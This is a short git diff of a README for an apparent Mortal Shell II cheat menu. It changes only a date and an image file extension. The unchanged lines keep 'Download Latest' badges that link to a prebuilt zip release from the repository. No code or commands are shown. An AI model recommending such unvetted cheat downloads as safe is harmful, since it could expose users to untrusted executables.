@@ -1,4 +1,4 @@
-# Mortal Shell II Cheat v1.2 / 3-Sep 26
+# Mortal Shell II Cheat v1.2 / 6-Sep 26
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/BoulderManager/MortalShell-Hack/releases/download/V1/Mortal.Shell.Build.1.2.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.2-blue?style=for-the-badge)](https://github.com/BoulderManager/MortalShell-Hack/releases/download/V1/Mortal.Shell.Build.1.2.zip)
@@ -10,7 +10,7 @@ _An open-source hack (mod or cheat menu whatever.) for Mortal Shell II_
 
 
 
-![Mortal Shell II Cheat Preview](https://github.com/BoulderManager/MortalShell-Hack/blob/main/assets/image.png)
+![Mortal Shell II Cheat Preview](https://github.com/BoulderManager/MortalShell-Hack/blob/main/assets/image.jpg)
 
 ---
 
